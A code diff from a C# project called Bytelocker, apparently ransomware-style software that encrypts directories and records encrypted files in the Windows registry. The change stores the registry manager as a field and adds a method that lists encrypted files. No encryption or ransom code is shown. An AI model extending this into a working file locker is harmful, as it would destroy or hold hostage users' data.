@@ -5,11 +5,13 @@ namespace Bytelocker.CryptoManager
 {
     class CryptoManagerMainHandler
     {
+        private RegistryManager rm;
+
         public CryptoManagerMainHandler()
         {
-            RegistryManager rm = new RegistryManager();
-            rm.CreateMainKey();
-            rm.CreateSubKey(RegistryManager.FOLDER_KEY_NAME);
+            this.rm = new RegistryManager();
+            this.rm.CreateMainKey();
+            this.rm.CreateSubKey(RegistryManager.FOLDER_KEY_NAME);
         }
 
         public void DecryptSingleFile(String file)
@@ -44,6 +46,19 @@ namespace Bytelocker.CryptoManager
                 dfm.ChooseDir(subDir);
                 dfm.EncryptDir();
             }
+        }
+
+        public List<String> FilesEncryptedList()
+        {
+            try
+            {
+                return new List<String>(rm.ReadAllValues(RegistryManager.FILES_KEY_NAME));
+            } catch (Exception)
+            {
+                // if the key does not exist return empty list
+                return new List<String>();
+            }
+            
         }
     }
 }
